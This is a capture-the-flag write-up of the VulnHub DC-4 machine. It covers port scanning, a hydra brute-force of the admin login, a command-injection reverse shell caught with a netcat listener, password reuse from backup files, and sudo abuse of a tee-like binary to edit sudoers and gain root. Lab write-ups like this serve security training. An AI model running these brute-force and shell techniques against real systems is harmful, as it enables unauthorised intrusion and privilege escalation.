---
title: Vulnhub - DC-4
date: 2023-03-28
author: Marius
tags: [ctf, 'vulnhub', 'linux']
---

Intermediate rated Linux box found in VulnHub or PG Play.

### Enumeration

```
└─$ rustscan -a 192.168.155.195 -- -sC -sV  | tee nmap

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp6/VowbK8MWfMDQsxHRV2yvL8ZO+FEkyIBPnDwTVKkJiVKaJMZ5ztAwTnkc30c3tvC/yCqDAJ5IbHzgvR3kHKS37d17K+/OLxalDutFjrWjG7mBxhMW/0gnrCqJokZBDXDuvHQonajsfSN6FmWoP0PDsfL8NQXwWIoMvTRYHtiEQqczV5CYZZtMKuOyiLCiWINUqKMwY+PTb0M9RzSGYSJvN8sZZnvIw/xU7xBCmaWuq8h2dIfsxy+FhrwZMhvhJOpBYtwZB+hos3bbV5FKHhVztxEo+Y2vyKTl6MXJ4qwCChJdaBAip/aUt1zDoF3cIb+yebteyDk8KIqmp5Ju4r
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIbZ4PXPXShXCcbe25IY3SYbzB4hxP4K2BliUGtuYSABZosGlLlL1Pi214yCLs3ORpGxsRIHv8R0KFQX+5SNSog=
|   256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDcvQZ2DbLqSSOzIbIXhyrDJ15duVKd9TEtxfX35ubsM
80/tcp open  http    syn-ack nginx 1.15.10
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web server

Looks like I have discovered admin login page.

![webserver login](/assets/img/dc-4/1.png)

Performed various enumeration, default credentials, directory brute-forcing, SQLi, but this did not result in anything useful. I have found **command.php**, but accessing it is prohibited as I need to log in.

### Exploitation

Looks like this needs to be brute-forced. So I spun up hydra for the job. Password was found in a couple of minutes using **rockyou.txt.**

```
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.155.195 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -I 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-28 08:18:59
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.155.195:80/login.php:username=^USER^&password=^PASS^:S=logout
[80][http-post-form] host: 192.168.155.195   login: admin   password: happy
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-28 08:19:25
```

After logging into the webserver, I have noticed that this might be vulnerable to command injection. I've edited my request using Burp to include a reverse shell, and surely I got a connection back to my listener.

![admin page](/assets/img/dc-4/2.png)

![burp request](/assets/img/dc-4/3.png)


```
└─$ nc -nvlp 80             
listening on [any] 80 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.155.195] 45814
whoami
www-data
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@dc-4:/usr/share/nginx/html$ 
```

### Privilege Escalation

By snooping around in other user directories, I have found local.txt flag and backup folder with presumably old passwords.

```
www-data@dc-4:/home/jim$ ls -la
ls -la
total 36
drwxr-xr-x 3 jim  jim  4096 Mar 28 22:00 .
drwxr-xr-x 5 root root 4096 Apr  7  2019 ..
-rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 jim  jim  3526 Apr  6  2019 .bashrc
-rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile
drwxr-xr-x 2 jim  jim  4096 Apr  7  2019 backups
-rw-r--r-- 1 root root   33 Mar 28 22:00 local.txt
-rw------- 1 jim  jim   528 Apr  6  2019 mbox
-rwsrwxrwx 1 jim  jim   174 Apr  6  2019 test.sh

www-data@dc-4:/home/jim/backups$ ls -la
ls -la
total 12
drwxr-xr-x 2 jim jim 4096 Apr  7  2019 .
drwxr-xr-x 3 jim jim 4096 Mar 28 22:00 ..
-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak
```

I've launched Hydra again, utilizing found list to attempt brute-force Jim's password. Perhaps he's reusing one of his old passwords.

![hydra](/assets/img/dc-4/4.png)

I have logged on as jim using this password and noticed Jim has mail. By inspecting mail I have found Charles password.

![mail](/assets/img/dc-4/5.png)

I've logged on as Charles and checked what he can run as sudo.

```
charles@dc-4:/tmp$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```

I'm not sure what **teehee** is, but after running **strings** command on this binary, I've found a help message.

![help](/assets/img/dc-4/6.png)

By googling text from this help message, I've found out that this is **tee** binary. This can be exploited to add user Charles to **sudoers** list to complete this machine.

![commands](/assets/img/dc-4/7.png)

GG, I am root.




